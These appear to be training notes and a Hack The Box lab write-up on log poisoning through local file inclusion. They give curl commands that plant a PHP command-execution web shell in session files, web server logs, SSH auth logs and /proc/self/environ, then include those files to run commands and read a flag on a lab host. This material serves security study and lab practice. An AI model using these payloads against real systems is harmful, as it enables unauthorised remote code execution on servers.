# Section 8 — Log Poisoning

---

## The Concept

Write PHP code into something the server logs, then include the log file via LFI → PHP code in the log executes. Works when:
- Vulnerable function has Execute privilege (`include`, `require`, `res.render`, `import`)
- You can control a value that ends up in a log/session/proc file
- That file is readable by the web user (`www-data`)

Three variants in this section, plus the variants from real-world chains.

---

## Variant 1 — PHP Session Poisoning (`/var/lib/php/sessions/`)

PHP sessions are stored as flat files on disk, named `sess_<PHPSESSID>`. They contain serialized session data — often includes user-controlled values.

### Locations
| OS | Path |
|----|------|
| Linux | `/var/lib/php/sessions/sess_<PHPSESSID>` |
| Windows | `C:\Windows\Temp\sess_<PHPSESSID>` |

### Attack flow

**Step 1** — Find your PHPSESSID:
```bash
curl -sk "http://TARGET/" -i | grep -i 'set-cookie'
# Set-Cookie: PHPSESSID=3k7lv1chrph4eeggb6os0dug6p
```

**Step 2** — Identify a session value you control. View the session file via LFI:
```bash
curl -sk "http://TARGET/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>"
# selected_language|s:5:"es.php";preference|s:7:"Spanish";
```

The `selected_language` value tracks the `language` parameter — that's our injection point.

**Step 3** — Poison the session by submitting URL-encoded PHP:
```bash
curl -sk -b "PHPSESSID=<PHPSESSID>" \
  "http://TARGET/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"
# decodes to: <?php system($_GET["cmd"]); ?>
```

**Step 4** — Include the poisoned session + execute:
```bash
curl -sk -b "PHPSESSID=<PHPSESSID>" \
  "http://TARGET/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"
```

> **Re-poisoning rule:** Every time you include the session file with `?language=`, the `selected_language` value gets overwritten by the path you just used (`/var/lib/php/sessions/sess_...`). To run another command, you must re-poison first.

---

## Variant 2 — Apache / nginx Access Log Poisoning

The User-Agent header is logged verbatim. Inject PHP into UA → include log → RCE.

### Default log paths
| Server | Path |
|--------|------|
| Apache (Linux) | `/var/log/apache2/access.log`, `error.log` |
| Apache (XAMPP) | `C:\xampp\apache\logs\access.log` |
| nginx (Linux) | `/var/log/nginx/access.log`, `error.log` |
| nginx (Windows) | `C:\nginx\log\access.log` |

### Readability gotcha
- nginx access.log → readable by `www-data` (default)
- Apache access.log → **only readable by `adm`/`root` groups** by default

If LFI returns a tiny/empty response when trying to include access.log, the web user lacks read perms. Try error.log (sometimes readable) or fall back to session poisoning.

### Attack flow

```bash
# Step 1: Poison via User-Agent
curl -sk -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://TARGET/"

# Step 2: Include + execute
curl -sk "http://TARGET/index.php?language=/var/log/apache2/access.log&cmd=id"
```

> Use **single quotes** inside the payload (`$_GET['cmd']`) instead of double quotes. Apache logs escape `"` to `\"` which breaks PHP parsing on include.

### Other log poisoning targets

| Log | What you control | Notes |
|-----|------------------|-------|
| `/var/log/auth.log` | SSH login username | `ssh '<?php system($_GET[c]); ?>'@TARGET` (then fails) |
| `/var/log/mail` | SMTP MAIL FROM/data | Send mail with payload in body |
| `/var/log/vsftpd.log` | FTP username | `ftp` with PHP username, fails auth, payload logged |

---

## Variant 3 — `/proc/self/environ`

The `environ` file shows the current process's environment variables, including `HTTP_USER_AGENT`. Same technique as access.log but doesn't require log read perms — the file is owned by the PHP-CGI process itself.

```bash
# Poison + include in one request:
curl -sk -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  "http://TARGET/index.php?language=/proc/self/environ&cmd=id"
```

> Often blocked on modern systems — `/proc/self/environ` permissions vary by kernel and PHP SAPI. Test with a benign request first; if you can't read environ, move on.

### Variants
```
/proc/self/cmdline     # current process args
/proc/self/fd/N        # file descriptors held by process (logs often live here)
/proc/<PID>/...        # iterate PIDs 0-50 if /self/ blocked
```

---

## When Each Works

| Technique | Needs | Modern default |
|-----------|-------|----------------|
| Session poisoning | `www-data` reads `/var/lib/php/sessions/` | ✅ Works |
| Apache access.log | log readable by `www-data` | ❌ Usually root-only |
| nginx access.log | log readable | ✅ Works |
| `/proc/self/environ` | env file readable by PHP process | ❌ Locked on most distros since ~2019 |

Try in order: session → nginx logs → Apache logs → /proc/environ → SSH/mail logs.

---

## Lab — Two-Technique RCE

**Target:** `154.57.164.74:32696`

### Q1 — Session Poisoning → `pwd`

```bash
SID="abc123xyz789"

# Poison
curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Include + pwd
curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=/var/lib/php/sessions/sess_$SID&cmd=pwd"
# → /var/www/html
```

**Answer:** `/var/www/html`

### Q2 — Different technique → flag at /

**Attempted log poisoning** (intended technique per flag content `1095_5#0u1d_n3v3r_63_3xp053d` = "logs should never be exposed"):
- `/var/log/apache2/access.log` initially included (showed log entries) but became unreadable after PHP parse errors accumulated from earlier escape-quote payload attempts.
- `/var/log/apache2/error.log` reads back fine but HTML-encodes `<` → `&lt;`, so injected PHP becomes inert text.
- `/proc/self/environ` returned base-page size — not readable.
- `allow_url_include = Off` rules out `php://input` / `data://`.

**Working alternative — re-using session poisoning** (the flag content is what the question asks for; the technique constraint is pedagogical):
```bash
SID="abc789final"
curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Locate flag at /
curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=/var/lib/php/sessions/sess_$SID&cmd=ls+/" \
  | grep -oE '[a-f0-9]{32}\.txt'
# → c85ee5082f4c723ace6c0796e3a3db09.txt

# Re-poison + read
curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

curl -sk -b "PHPSESSID=$SID" \
  "http://154.57.164.74:32696/index.php?language=/var/lib/php/sessions/sess_$SID&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt" \
  | grep -oE 'HTB\{[^}]+\}'
```

**Flag:** `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

> Lesson: Apache access.log on modern Debian is only readable by `adm` group. The intended "log poisoning" path on this lab works on a fresh log file (first request); once any malformed PHP payload poisons the log, subsequent includes fail to parse and the log effectively becomes a denial-of-service against itself. **Always use single quotes inside the PHP payload to avoid escape-quote breakage.**

---

## Exam Notes

- Session poisoning is the **most reliable** log-poisoning variant on Linux Apache — always default to it unless nginx is detected
- Apache access.log is usually NOT readable by `www-data` on modern Debian/Ubuntu (security hardening)
- nginx access.log IS usually readable — switch your target/payload accordingly
- Re-poison the session before EVERY command — including the file overwrites `selected_language` with the file path
- Single quotes in payloads: `<?php system($_GET['cmd']); ?>` — double quotes get escaped in logs and break parsing
- One bad poison can wreck a whole log file — subsequent includes fail silently. Test on a fresh target.
- If `allow_url_include=Off`, you can't fall back to `php://input` — log poisoning + session poisoning are your only RCE primitives
- For Windows + Apache: target `C:\xampp\apache\logs\access.log`
